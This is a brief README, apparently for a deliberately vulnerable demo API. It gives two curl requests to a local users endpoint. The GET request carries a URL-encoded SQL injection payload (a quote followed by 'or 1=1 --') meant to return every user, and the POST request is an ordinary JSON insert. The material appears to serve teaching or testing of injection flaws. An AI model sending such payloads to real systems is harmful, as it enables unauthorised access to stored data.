# vulnerable

## get request
```bash
curl http://localhost:8080/vun/api/users?name=michal%27%20or%201=1%20--%20-
```

## Post request
```bash
curl -X POST http://localhost:8080/vun/api/users -H "Content-Type: application/json" -d '{"name": "michal", "surname": "hacker"}'  
```